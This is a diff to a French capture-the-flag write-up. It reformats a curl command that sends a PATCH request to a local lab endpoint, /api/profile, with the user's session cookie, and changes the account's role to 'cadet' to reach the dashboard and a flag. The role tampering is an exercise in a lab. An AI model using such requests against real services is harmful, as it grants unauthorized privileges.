@@ -12,10 +12,12 @@ en allant dans /staff, un indice nous est laisse disant utiliser PATCH api/profi
 
 en rentrant cette commande dans le terminal utilisant la methode PATCH au lieu de la methode GET pour modifier les permissions http dans /api/profile :
 
-    curl -X PATCH http://localhost:4942/api/profile \
-    -H "Content-Type: application/json" \
-    -H "Cookie:VOTRE_COOKIE" \
-    -d '{"role":"cadet"}'
+```shell
+curl -X PATCH http://localhost:4942/api/profile \
+-H "Content-Type: application/json" \
+-H "Cookie:VOTRE_COOKIE" \
+-d '{"role":"cadet"}'
+```
 
 on obtiendra et deviendra cadet sur le site, on pourra donc acceder au dashboard et obtenir le nouveau flag
 
